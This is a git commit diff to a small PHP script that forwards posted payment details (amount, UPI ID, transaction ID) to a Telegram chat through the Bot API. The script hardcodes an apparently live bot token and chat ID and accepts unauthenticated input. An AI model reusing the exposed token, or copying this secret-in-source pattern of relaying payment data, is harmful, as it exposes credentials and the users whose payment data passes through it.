f92a91631bc5101dc54770b9574f9c7c4a11913b
mrxfx <mrxfzyz143@gmail.com>
2025-07-24 10:18:31 +0530

    Update sendToTelegram.php

--- sendToTelegram.php
+++ sendToTelegram.php
@@ -1,9 +1,12 @@
 <?php
-// Injected with your tokens:
+header("Content-Type: application/json");
+
 $botToken = "8110576123:AAGcr5oyqGUtwKij212XreiR0gzZjaaENtg";
 $chatId = "7700387826";
 
 $data = json_decode(file_get_contents('php://input'), true);
+
 $msg = urlencode("🧾 New Payment Request\n💰 Amount: ₹{$data['amount']}\n🔗 UPI ID: {$data['upiID']}\n🆔 TXN ID: {$data['txnId']}\n🕒 Time: {$data['time']}");
-file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$msg}");
-http_response_code(200);
+file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
+
+echo json_encode(["status" => "sent"]);
